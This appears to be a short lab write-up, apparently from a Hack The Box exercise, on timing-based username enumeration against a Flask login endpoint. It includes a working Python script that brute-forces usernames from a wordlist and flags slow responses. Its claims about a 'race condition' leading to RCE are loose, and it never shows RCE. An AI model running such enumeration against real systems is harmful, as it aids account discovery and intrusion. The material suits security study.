**User Enumeration via RaceCondition**
In this scenario we have a Python based application that performs a DB query to check for a login. In this case we can use the Race-condition to enumerate users and finally get to a rce.

# Scenario
The application perform a query to the back-end DB to check for existence on the Back-end DB. This takes naturally some time:
```
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    
    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if not user:
        return render_template('index.html', message='Incorrect Details', type='danger')

```

## Attack
In this attack we will use a race-condition and check the user enumeration as we would do a blind time based SQL injection. 
1)Perform a login check(fetch the request via Burpsuite) and compare the response time with a valid user(htb-stdnt) and a nonexistent one.
```
The existing user should take much longer(180ms) that a fake one(3ms).
```

2)Use this Python script to perform a user brute-force (Adjust with word-list, threshold param etc)
```
import requests

URL = "http://94.237.57.59:45622/reset"
WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.10

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()
        r = requests.post(URL, data={"username": username})
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username found: {username}")


```
3)OBS: this attack might not be as reliable over internet as latency might create some false positives.